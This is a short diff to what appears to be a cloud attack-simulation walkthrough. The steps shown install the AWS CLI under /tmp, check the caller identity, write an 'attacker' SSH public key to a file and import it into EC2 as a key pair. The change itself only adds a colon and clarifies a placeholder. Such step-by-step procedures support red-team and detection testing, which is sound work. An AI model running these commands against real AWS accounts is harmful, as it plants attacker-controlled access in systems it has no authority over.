@@ -29,10 +29,12 @@ cat attacker_key.pub
 ```bash
 curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "/tmp/awscliv2.zip" && unzip /tmp/awscliv2.zip -d /tmp/aws && cd /tmp/aws && ./aws/install --install-dir /tmp/aws-cli --bin-dir /tmp/aws-cli-bin && /tmp/aws-cli-bin/aws sts get-caller-identity
 ```
-6. Run the following command to create a file containing your attacker public key
+6. Run the following command to create a file containing your attacker public key:
 ```bash
 echo "{attacker_key.pub}" > /tmp/attacker_key.pub
 ```
+`{attacker_key.pub}` refers to the output from Step 3 above.
+
 7. Run the following command to import your SSH Public Key
 ```bash
 /tmp/aws-cli-bin/aws ec2 import-key-pair --key-name attacker_key --public-key-material fileb:///tmp/attacker_key.pub
